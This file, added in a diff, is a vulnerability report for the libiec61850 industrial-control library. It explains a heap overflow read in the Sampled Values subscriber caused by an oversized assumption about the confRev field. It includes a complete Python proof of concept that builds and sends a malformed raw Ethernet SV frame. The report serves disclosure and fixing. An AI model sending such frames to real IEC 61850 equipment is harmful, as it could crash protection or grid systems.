@@ -1,0 +1,51 @@
+issue #598
+
+Summary
+A malformed Sampled Values (SV) frame can trigger a heap-buffer-overflow read in the SV subscriber path of libiec61850 both in the v1.6 branch( release v1.6.1)and v1.6_develop branch(commit:196bb76). And the next details are analyzed in the master commit of v1.6_develop
+
+The issue is caused by a mismatch between:
+
+parsing-time validation, which accepts a BER/ASN.1 confRev element of any length as long as it stays within the current ASDU buffer, and
+getter-time decoding, which later assumes that confRev is always a 4-byte fixed-width field and unconditionally reads sizeof(uint32_t) bytes.
+As a result, an attacker on the same Layer-2 network can send a crafted SV frame in which confRev is encoded as length 1 and placed near the end of the receiver heap buffer. When the subscriber callback or internal debug path accesses SVSubscriber_ASDU_getConfRev, the library performs an out-of-bounds read past the end of the packet buffer and the subscriber process aborts under ASan.
+
+PoC
+
+import socket
+
+def ber_len(n):
+    if n < 0x80:
+        return bytes([n])
+    b = []
+    while n:
+        b.append(n & 0xff)
+        n >>= 8
+    b = bytes(reversed(b))
+    return bytes([0x80 | len(b)]) + b
+
+def tlv(tag, content):
+    return bytes([tag]) + ber_len(len(content)) + content
+
+TOTAL = 1518
+APDU_LEN = 1496
+src = bytes.fromhex('ae7bbe83e9ef')
+dst = bytes.fromhex('010ccd040001')
+
+frame_hdr = (
+    dst +
+    src +
+    bytes.fromhex('88ba') +
+    (0x4000).to_bytes(2, 'big') +
+    (APDU_LEN + 8).to_bytes(2, 'big') +
+    b'\x00\x00\x00\x00'
+)
+
+confrev = b'\x83\x01\x41'
+filler_len = (APDU_LEN - 12) - len(confrev) - 4
+filler = bytes([0x99]) + ber_len(filler_len) + (b'Z' * filler_len)
+apdu = tlv(0x60, tlv(0xa2, tlv(0x30, filler + confrev)))
+frame = frame_hdr + apdu
+
+s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
+s.bind(('auditg0', 0))
+s.send(frame)
